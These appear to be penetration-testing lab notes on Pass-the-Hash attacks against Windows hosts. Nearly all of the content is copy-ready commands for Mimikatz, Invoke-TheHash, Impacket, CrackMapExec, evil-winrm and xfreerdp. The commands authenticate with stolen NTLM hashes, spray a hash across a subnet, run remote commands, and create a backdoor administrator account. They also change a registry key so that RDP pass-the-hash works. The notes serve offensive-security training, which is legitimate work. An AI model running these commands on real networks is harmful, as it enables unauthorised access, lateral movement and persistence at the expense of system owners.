

            Pass the Hash with Mimikatz (Windows)


    Mimikatz

 To use this module, we will need the following:


    /user - The user name we want to impersonate.
    
    /rc4 or /NTLM - NTLM hash of the user's password.
    
    /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
    
    /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).


    c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit




            Pass the Hash with PowerShell Invoke-TheHash (Windows)

            (https://github.com/Kevin-Robertson/Invoke-TheHash)

    
    When using Invoke-TheHash, we have two options: SMB or WMI command execution.



    Target - Hostname or IP address of the target.
    Username - Username to use for authentication.
    Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.



    PS c:\htb> cd C:\tools\Invoke-TheHash\
    
    PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
    
    PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose




                Pass the Hash with Impacket (Linux)




        Pass the Hash with Impacket PsExec

    $ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

    There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

    impacket-wmiexec
    impacket-atexec
    impacket-smbexec




                Pass the Hash with CrackMapExec (Linux)

    $ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

    
    CrackMapExec - Command Execution

    $ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

    If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add --local-auth to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. 

    


                Pass the Hash with evil-winrm (Linux)

    
    $ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453



    Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb



                Pass the Hash with RDP (Linux)


    Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

    account restrictions are preventing this user from signing in....

    This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

    c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f


    Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:


    $ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B



            UAC Limits Pass the Hash for Local Accounts


    UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.


    Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. 


    These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.

